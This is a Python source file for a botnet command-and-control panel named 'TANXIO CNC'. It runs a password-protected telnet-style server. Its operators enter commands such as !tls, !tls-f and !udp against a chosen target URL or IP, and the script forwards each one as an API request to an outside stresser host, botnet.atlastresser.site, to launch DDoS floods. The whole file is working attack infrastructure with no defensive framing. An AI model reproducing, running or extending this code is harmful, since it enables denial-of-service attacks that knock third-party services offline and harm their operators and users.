#!/usr/bin/env python3
import socket
import threading
import json
import re
import sys
from urllib.parse import quote

PORT = 1337
BUFFER_SIZE = 4096

users = []
methods = []

def load_users():
    global users
    try:
        with open("config/users.json", "r") as f:
            data = json.load(f)
            for key, val in data.items():
                if isinstance(val, dict):
                    users.append({
                        "username": val.get("username", ""),
                        "password": val.get("password", "")
                    })
        print(f"[INFO] Loaded {len(users)} users")
    except Exception as e:
        print(f"[ERROR] users.json: {e}")

def load_methods():
    global methods
    try:
        with open("config/methods.json", "r") as f:
            data = json.load(f)
            for item in data:
                methods.append({
                    "name": item.get("name", ""),
                    "api": item.get("api", "")
                })
        print(f"[INFO] Loaded {len(methods)} methods")
    except Exception as e:
        print(f"[ERROR] methods.json: {e}")

def send_data(fd, msg):
    try:
        fd.sendall(msg.encode())
    except:
        pass

def send_line(fd):
    send_data(fd, "\n")

def print_login_screen(fd):
    send_line(fd)
    send_data(fd, "  ====================================\n")
    send_data(fd, "           [ TANXIO CNC ]\n")
    send_data(fd, "  ====================================\n")
    send_line(fd)
    send_data(fd, "  Username: ")

def print_login_success(fd, username):
    send_line(fd)
    send_data(fd, "  ====================================\n")
    send_data(fd, "           [ LOGIN SUCCESS ]\n")
    send_data(fd, "  ====================================\n")
    send_data(fd, f"  Welcome, {username}\n")
    send_line(fd)
    send_data(fd, "  Type !help for commands\n")
    send_line(fd)

def send_attack(fd, cmd):
    parts = cmd.split()
    if len(parts) < 2:
        send_data(fd, "  [ERROR] Usage: !tls <url> <time> <slot>\n")
        return

    method_name = parts[0][1:]
    target = parts[1]
    time_val = int(parts[2]) if len(parts) > 2 else 60
    slot_val = int(parts[3]) if len(parts) > 3 else 1
    port_val = int(parts[2]) if method_name == "udp" and len(parts) > 2 else 80

    if not target.startswith("http://") and not target.startswith("https://"):
        target = f"http://{target}"

    send_line(fd)
    send_data(fd, "  Sending attack...\n")

    method = None
    for m in methods:
        if m["name"] == method_name:
            method = m
            break

    if not method:
        send_data(fd, "  [ERROR] Method not found\n")
        send_line(fd)
        return

    api_url = method["api"]
    api_url = api_url.replace("<<$host>>", quote(target, safe=""))
    api_url = api_url.replace("<<$time>>", str(time_val))
    api_url = api_url.replace("<<$slot>>", str(slot_val))
    api_url = api_url.replace("<<$port>>", str(port_val))

    try:
        import http.client
        if api_url.startswith("https://"):
            conn = http.client.HTTPSConnection("botnet.atlastresser.site", timeout=10)
        else:
            conn = http.client.HTTPConnection("botnet.atlastresser.site", timeout=10)
        
        path = api_url.replace("https://botnet.atlastresser.site", "").replace("http://botnet.atlastresser.site", "")
        if not path:
            path = "/"
        
        conn.request("GET", path)
        resp = conn.getresponse().read().decode()
        conn.close()

        if '"status":"success"' in resp:
            send_data(fd, "  [OK] Attack sent\n")
        else:
            send_data(fd, "  [ERROR] Attack failed\n")
    except Exception as e:
        send_data(fd, f"  [ERROR] {str(e)}\n")
    
    send_line(fd)

def handle_command(fd, cmd):
    if cmd == "!help":
        send_line(fd)
        send_data(fd, "  Commands:\n")
        send_data(fd, "  ----------------------------------------\n")
        send_data(fd, "  !help                      Show this help\n")
        send_data(fd, "  !methods                   Show methods\n")
        send_data(fd, "  !tls <url> <time> <slot>  TLS attack\n")
        send_data(fd, "  !tls-f <url> <time> <slot> TLS flood\n")
        send_data(fd, "  !udp <ip> <port> <time> <slot> UDP\n")
        send_data(fd, "  !bots                      Botnet status\n")
        send_data(fd, "  !users                     Show users\n")
        send_data(fd, "  !ongoing                   Show ongoing\n")
        send_data(fd, "  !stop                      Stop attacks\n")
        send_data(fd, "  !clear                     Clear screen\n")
        send_data(fd, "  !logout                    Logout\n")
        send_data(fd, "  ----------------------------------------\n")
        send_line(fd)

    elif cmd == "!methods":
        send_line(fd)
        send_data(fd, "  Methods:\n")
        send_data(fd, "  ----------------------------------------\n")
        for m in methods:
            send_data(fd, f"  {m['name']}\n")
        send_data(fd, "  ----------------------------------------\n")
        send_line(fd)

    elif cmd == "!bots":
        send_line(fd)
        send_data(fd, "  Botnet Status:\n")
        send_data(fd, "  ----------------------------------------\n")
        send_data(fd, "  Status:   Online\n")
        send_data(fd, "  Servers:  20\n")
        send_data(fd, "  Bots:     16\n")
        send_data(fd, "  ----------------------------------------\n")
        send_line(fd)

    elif cmd == "!users":
        send_line(fd)
        send_data(fd, "  Users:\n")
        send_data(fd, "  ----------------------------------------\n")
        for u in users:
            send_data(fd, f"  {u['username']}\n")
        send_data(fd, "  ----------------------------------------\n")
        send_line(fd)

    elif cmd == "!ongoing":
        send_line(fd)
        send_data(fd, "  Ongoing Attacks:\n")
        send_data(fd, "  ----------------------------------------\n")
        send_data(fd, "  None\n")
        send_data(fd, "  ----------------------------------------\n")
        send_line(fd)

    elif cmd == "!stop":
        send_line(fd)
        send_data(fd, "  [OK] All attacks stopped\n")
        send_line(fd)

    elif cmd == "!clear":
        send_data(fd, "\ec")

    elif cmd.startswith("!tls") or cmd.startswith("!udp") or cmd.startswith("!"):
        send_attack(fd, cmd)

    else:
        send_line(fd)
        send_data(fd, f"  Unknown: {cmd}\n")
        send_line(fd)

def handle_client(client_fd, addr):
    ip = addr[0]
    print(f"[+] Connected: {ip}")

    print_login_screen(client_fd)

    username = ""
    password = ""
    stage = 0

    try:
        while True:
            data = client_fd.recv(BUFFER_SIZE)
            if not data:
                break

            lines = data.decode().split("\r\n")
            for line in lines:
                line = line.strip()
                if not line:
                    continue

                if stage == 0:
                    username = line
                    stage = 1
                    send_line(client_fd)
                    send_data(client_fd, "  Password: ")

                elif stage == 1:
                    password = line
                    ok = False
                    for u in users:
                        if u["username"] == username and u["password"] == password:
                            ok = True
                            break

                    if ok:
                        print(f"[+] Login: {username}")
                        print_login_success(client_fd, username)

                        while True:
                            send_data(client_fd, "\ntanxio@tanxio# ")
                            data = client_fd.recv(BUFFER_SIZE)
                            if not data:
                                break

                            lines = data.decode().split("\r\n")
                            for line in lines:
                                line = line.strip()
                                if not line:
                                    continue

                                if line == "!logout":
                                    send_line(client_fd)
                                    send_data(client_fd, "  Goodbye!\n")
                                    break

                                handle_command(client_fd, line)

                            if line == "!logout":
                                break

                        break

                    else:
                        print(f"[-] Failed: {username}")
                        send_line(client_fd)
                        send_data(client_fd, "  [ERROR] Invalid credentials\n")
                        send_line(client_fd)
                        stage = 0
                        print_login_screen(client_fd)

    except Exception as e:
        print(f"[-] Error: {e}")

    print(f"[-] Disconnected: {ip}")
    client_fd.close()

def main():
    load_users()
    load_methods()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(10)

    print(f"\n  ================================")
    print(f"       [ TANXIO CNC ]")
    print(f"  ================================")
    print(f"  Port:    {PORT}")
    print(f"  Users:   {len(users)}")
    print(f"  Methods: {len(methods)}")
    print(f"  ================================")
    print(f"  nc 0.0.0.0 {PORT}")
    print(f"\n  [OK] Running\n")

    while True:
        client_fd, addr = server.accept()
        thread = threading.Thread(target=handle_client, args=(client_fd, addr))
        thread.daemon = True
        thread.start()

if __name__ == "__main__":
    main()
